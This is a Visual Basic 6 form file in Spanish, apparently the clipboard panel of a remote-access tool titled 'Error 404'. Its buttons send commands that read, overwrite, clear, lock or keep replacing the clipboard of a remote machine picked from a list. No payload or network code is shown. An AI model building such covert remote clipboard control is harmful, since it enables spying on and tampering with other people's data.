VERSION 5.00
Begin VB.Form frmClipboard 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Error 404 - Portapapeles"
   ClientHeight    =   7215
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   6615
   Icon            =   "frmClipboard.frx":0000
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7215
   ScaleWidth      =   6615
   StartUpPosition =   2  'CenterScreen
   Begin VB.Timer tmrGeneral 
      Interval        =   2000
      Left            =   6120
      Top             =   3600
   End
   Begin VB.Frame Frame3 
      BackColor       =   &H00FFFFFF&
      Height          =   1695
      Left            =   120
      TabIndex        =   11
      Top             =   5400
      Width           =   6375
      Begin VB.CommandButton cmdStopContinueClipboard 
         Caption         =   "Parar Portapapeles Continuo"
         Height          =   255
         Left            =   3480
         TabIndex        =   15
         Top             =   1320
         Width           =   2535
      End
      Begin VB.CommandButton cmdSetContinueClipboard 
         Caption         =   "Escoger Portapapeles Continuo"
         Height          =   255
         Left            =   360
         TabIndex        =   14
         Top             =   1320
         Width           =   2655
      End
      Begin VB.TextBox txtContinueClipboard 
         Height          =   735
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   13
         Top             =   480
         Width           =   6135
      End
      Begin VB.Label lblClipboard 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Portapapeles Continuo:"
         Height          =   195
         Left            =   120
         TabIndex        =   12
         Top             =   240
         Width           =   1650
      End
   End
   Begin VB.CommandButton cmdSetClipboard 
      BackColor       =   &H8000000B&
      Caption         =   "Escoger Portapapeles"
      Height          =   255
      Left            =   2280
      MaskColor       =   &H80000010&
      TabIndex        =   9
      Top             =   4440
      Width           =   1815
   End
   Begin VB.CommandButton cmdCleanClipboard 
      BackColor       =   &H8000000B&
      Caption         =   "Limpiar Portapapeles"
      Height          =   255
      Left            =   4440
      MaskColor       =   &H80000010&
      TabIndex        =   8
      Top             =   4440
      Width           =   1695
   End
   Begin VB.CommandButton cmdUnlockClipboard 
      BackColor       =   &H8000000B&
      Caption         =   "Desbloquear Portapapeles"
      Height          =   255
      Left            =   3480
      MaskColor       =   &H80000010&
      TabIndex        =   7
      Top             =   4920
      Width           =   2175
   End
   Begin VB.CommandButton cmdLockClipboard 
      BackColor       =   &H8000000B&
      Caption         =   "Bloquear Portapapeles"
      Height          =   255
      Left            =   1080
      MaskColor       =   &H80000010&
      TabIndex        =   6
      Top             =   4920
      Width           =   1935
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H00FFFFFF&
      Height          =   615
      Left            =   1680
      TabIndex        =   3
      Top             =   3600
      Width           =   3255
      Begin VB.CommandButton cmdCleanText 
         BackColor       =   &H8000000B&
         Caption         =   "Limpiar Texto"
         Height          =   255
         Left            =   1800
         TabIndex        =   5
         Top             =   240
         Width           =   1335
      End
      Begin VB.CommandButton cmdCopyText 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Copiar Texto"
         Height          =   255
         Left            =   120
         TabIndex        =   4
         Top             =   240
         Width           =   1335
      End
   End
   Begin VB.CommandButton cmdLookClipboard 
      BackColor       =   &H8000000B&
      Caption         =   "Ver Portapapeles"
      Height          =   255
      Left            =   360
      MaskColor       =   &H80000010&
      TabIndex        =   2
      Top             =   4440
      Width           =   1575
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00FFFFFF&
      Height          =   3495
      Left            =   120
      TabIndex        =   0
      Top             =   0
      Width           =   6375
      Begin VB.TextBox txtClipboard 
         BackColor       =   &H00000000&
         ForeColor       =   &H00FFFFFF&
         Height          =   3015
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   1
         Top             =   360
         Width           =   6135
      End
      Begin VB.Label lblState 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Sin Modificaciones"
         Height          =   195
         Left            =   240
         TabIndex        =   10
         Top             =   120
         Width           =   1335
      End
   End
   Begin VB.Menu menu 
      Caption         =   "Menu"
      Visible         =   0   'False
      Begin VB.Menu verclipboard 
         Caption         =   "Ver Clipboard"
      End
      Begin VB.Menu limpiar 
         Caption         =   "Limpiar Clipboard"
      End
      Begin VB.Menu block 
         Caption         =   "Block Clipboard"
      End
      Begin VB.Menu desblock 
         Caption         =   "Desblock Clipboard"
      End
      Begin VB.Menu ponerclip 
         Caption         =   "Poner Clipboard"
      End
      Begin VB.Menu limpiartext 
         Caption         =   "Limpiar"
      End
   End
End
Attribute VB_Name = "frmClipboard"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub cmdCleanClipboard_Click()
Send "ClearClip"
End Sub

Private Sub cmdSetContinueClipboard_Click()
Send "SetContinueClipboard|" & txtContinueClipboard.Text
End Sub

Private Sub cmdLockClipboard_Click()
Send "LockClip"
End Sub

Private Sub cmdLookClipboard_Click()
Send "GetClip"
End Sub

Private Sub cmdCopyText_Click()
Clipboard.SetText (txtClipboard)
End Sub

Private Sub cmdCleanText_Click()
txtClipboard.Text = ""
End Sub

Private Sub cmdSetClipboard_Click()
Send "SetClip|" & txtClipboard.Text
End Sub

Private Sub cmdStopContinueClipboard_Click()
Send "StopContinueClipboard"
End Sub

Private Sub cmdUnlockClipboard_Click()
Send "UnlockClip"
End Sub

Private Sub Form_Load()
On Error Resume Next
Me.Caption = frmClipboard.Caption & "[" & frmMain.LV.SelectedItem & "]"
End Sub
